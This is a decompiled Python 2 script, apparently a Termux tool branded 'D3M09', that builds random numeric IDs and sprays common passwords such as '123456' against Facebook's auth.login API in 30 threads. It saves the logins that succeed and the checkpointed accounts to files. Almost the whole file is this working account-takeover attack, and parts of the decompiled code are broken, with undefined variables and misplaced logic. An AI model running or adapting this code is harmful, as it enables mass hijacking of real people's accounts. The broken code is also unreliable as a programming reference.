# DECOMPILED BY HUNTERBOY ALAMIN
# FACEBOK : MD ALAMIN KHAN
import os
import sys                                                    
import time                                                   
import datetime
import random                                                 
import hashlib                                                
import re
import threading                                              
import json                                                   
import urllib
import cookielib                                              
import getpass
import uuid                                                   
os.system('rm -rf .txt')
for n in range(99080):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')                       
    print nmbr
    sys.stdout.flush()


try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')


try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 2k9.pyc')

import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
import cookielib
import requests
import mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
br.addheaders = [
    ('User-Agent', 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/13.6.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5];FBNV/1')]
br.addheaders = [
    ('user-agent', 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/13.5.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]')]

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3 / 200)



def tik():
    titik = [
        '   ',
        '.  ',
        '.. ',
        '...',
        '.. ',
        '.  ',
        '   ']
    for o in titik:
        print '\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;92mD3M09 TOOL Loa\x1b[1;90mding \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.5)


back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
logo1 = '\x1b[1;91m         ____ _____ __  __  ___   ___\n\x1b[1;91m        |  _ \\___ /|  \\/  |/ _ \\ / _ \\\n\x1b[1;92m        | | | ||_ \\| |\\/| | | | | (_) |\n\x1b[1;92m        | |_| |__) | |  | | |_| |\\__, |\n\x1b[1;91m        |____/____/|_|  |_|\\___/   / /\n\x1b[1;91m                                  / /\n--------------------------------------------------\n\x1b[1;97m'
print logo1
CorrectUsername = 'D3M09'
CorrectPassword = 'Jobayer'
loop = 'true'
while loop == 'true':
    username = raw_input('\x1b[1;92m \x1b[1;92mTool Username \x1b[1;92m:\x1b[1;92m ')
    if username == CorrectUsername:
        password = raw_input('\x1b[1;92m \x1b[1;92mTool Password \x1b[1;92m:\x1b[1;92m ')
        if password == CorrectPassword:
            print 'Login Successfull as D3M09'
            time.sleep(1)
            loop = 'false'
        else:
            print '\x1b[1;92mWrong Password'
            os.system('xdg-open https://www.facebook.com/101057899124842')
        print '\x1b[1;92mWrong Username'
        os.system('xdg-open https://www.facebook.com/101057899124842')

    def lisensi():
        os.system('clear')
        login()


    def login():
        os.system('clear')
        print logo1
        print
        print '\x1b[1;93m(\x1b[1;97m1\x1b[1;93m)\x1b[1;92m 2009-10\x1b[1;93m [\x1b[1;97mTwo Code\x1b[1;93m]'
        print '\x1b[1;93m(\x1b[1;97m2\x1b[1;93m)\x1b[1;92m 2008-09\x1b[1;93m [\x1b[1;97mOne Code\x1b[1;93m]'
        print '\x1b[1;93m(\x1b[1;97mH\x1b[1;93m)\x1b[1;92m Help'
        print '\x1b[1;93m(\x1b[1;97m0\x1b[1;93m)\x1b[1;97m Back'
        gaja_demon()


    def gaja_demon():
        demon = raw_input('\n\x1b[1;95m\xe2\x80\xa2\xe2\x9e\xa2 \x1b[1;96m')
        if demon == '':
            print '\x1b[1;97mFill In Correctly'
            gaja_login()
        elif demon == '1':
            p()
        elif demon == '2':
            b()
        elif demon == 'H,h':
            os.system('xdg-open https://www.facebook.com/101057899124842')
        else:
            print 'Fill In Correctly'


    def p():
        os.system('clear')
        print logo1
        print
        print 'Do You Want Countinue [y/n]'
        act()


    def act():
        demon = raw_input('\n\n \x1b[1;97m  ')
        if demon == '':
            print '[!] Fill in correctly'
            act()
        elif demon == 'y':
            tik()
            os.system('clear')
            print logo1
            print
            print '\x1b[1;93mTYPE ANY TWO CODE'
            print '\n'
            print

            try:
                c = raw_input('>>> ')
                k = '100000'
                idlist = '.txt'
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())
            except IOError:
                print '[!] File Not Found'
                raw_input('\n[ Back ]')
                demon()


        if demon == 'n':
            login()
        else:
            print '[!] Fill In Correctly'
            action()
        print 47 * '\x1b[1;93m-'
        xxx = str(len(id))
        jalan('\x1b[1;96m TOTAL IDS NUMBER : ' + xxx)
        jalan('\x1b[1;93m TO STOP THIS PROCESS PRESS Ctrl THEN z')
        print 47 * '\x1b[1;93m-'

        def main(arg):
            user = arg

            try:
                os.mkdir('save')
            except OSError:
                pass


            try:
                pass1 = '123456'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;93m   (D3M09-HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass1
                    okb = open('sdcard/ids/successful.txt', 'a')
                    okb.write(k + c + user + pass1 + '\n')
                    okb.close()
                    oks.append(c + user + pass1)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;92m   (D3M09-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass1
                    cps = open('sdcard/ids/checkpoint.txt', 'a')
                    cps.write(k + c + user + pass1 + '\n')
                    cps.close()
                    cpb.append(c + user + pass1)
                else:
                    pass2 = '123456789'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m   (D3M09-HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass2
                        okb = open('sdcard/ids/successful.txt', 'a')
                        okb.write(k + c + user + pass2 + '\n')
                        okb.close()
                        oks.append(c + user + pass2)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;92m   (D3M09-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass2
                        cps = open('sdcard/ids/checkpoint.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass3 = '@@123@@'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;93m   (D3M09-HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass3
                            okb = open('sdcard/ids/successful.txt', 'a')
                            okb.write(k + c + user + pass3 + '\n')
                            okb.close()
                            oks.append(c + user + pass3)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;92m   (D3M09-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass3
                            cps = open('sdcard/ids/checkpoint.txt', 'a')
                            cps.write(k + c + user + pass3 + '\n')
                            cps.close()
                            cpb.append(c + user + pass3)
            except:
                pass



        p = ThreadPool(30)
        p.map(main, id)
        print 50 * '\x1b[1;91m-'
        print 'Process Has Been Completed ...'
        raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')
        login()


    def b():
        os.system('clear')
        print logo1
        print
        print
        print 'Do You Want Countinue [y/n]'
        action()


    def action():
        demon = raw_input('\n\n \x1b[1;97m  ')
        if demon == '':
            print '[!] Fill In Correctly'
            action()
        elif demon == 'y':
            tik()
            os.system('clear')
            print logo1
            print

            try:
                c = raw_input('TYPE ANY 1 DIGIT NUMBER >>>')
                k = '1000000'
                idlist = '.txt'
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())
            except IOError:
                print '[!] File Not Found'
                raw_input('\n[ Back ]')
                demon()


        if demon == 'n':
            login()
        else:
            print '[!] Fill In Correctly'
            action()
        print 47 * '\x1b[1;93m-'
        xxx = str(len(id))
        jalan('\x1b[1;96m TOTAL IDS NUMBER : ' + xxx)
        jalan('\x1b[1;93m TO STOP THIS PROCESS PRESS Ctrl THEN z')
        print 47 * '\x1b[1;93m-'

        def main(arg):
            user = arg

            try:
                os.mkdir('save')
            except OSError:
                pass


            try:
                pass1 = '123456'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;93m   (D3M09-HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass1
                    okb = open('sdcard/ids/successful.txt', 'a')
                    okb.write(k + c + user + pass1 + '\n')
                    okb.close()
                    oks.append(c + user + pass1)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;92m   (D3M09\x1b[1;97m-CP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass1
                    cps = open('sdcard/ids/checkpoint.txt', 'a')
                    cps.write(k + c + user + pass1 + '\n')
                    cps.close()
                    cpb.append(c + user + pass1)
                else:
                    pass2 = '123456789'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m   (D3M09-HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass2
                        okb = open('sdcard/ids/successful.txt', 'a')
                        okb.write(k + c + user + pass2 + '\n')
                        okb.close()
                        oks.append(c + user + pass2)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;92m   (D3M09-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass2
                        cps = open('sdcard/ids/checkpoint.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass3 = '1234567'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;93m   (D3M09-HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass3
                            okb = open('sdcard/ids/successful.txt', 'a')
                            okb.write(k + c + user + pass3 + '\n')
                            okb.close()
                            oks.append(c + user + pass3)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;92m   (D3M09\x1b[1;97m-CP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass3
                            cps = open('sdcard/ids/checkpoint.txt', 'a')
                            cps.write(k + c + user + pass3 + '\n')
                            cps.close()
                            cpb.append(c + user + pass3)
                        else:
                            pass4 = '12345678'
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m   (D3M09-HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass4
                                okb = open('sdcard/ids/successful.txt', 'a')
                                okb.write(k + c + user + pass4 + '\n')
                                okb.close()
                                oks.append(c + user + pass4)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;92m   (D3M09\x1b[1;97m-CP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass4
                                cps = open('sdcard/ids/checkpoint.txt', 'a')
                                cps.write(k + c + user + pass4 + '\n')
                                cps.close()
                                cpb.append(c + user + pass4)
            except:
                pass



        p = ThreadPool(30)
        p.map(main, id)
        print 50 * '\x1b[1;91m-'
        print 'Process Has Been Completed ...'
        print 'Total Online/Offline : ' + str(len(oks)) + '/' + str(len(cpb))
        raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')
        login()

    if __name__ == '__main__':
        os.system('git pull')
        os.system('termux-setup-storage')
        login()

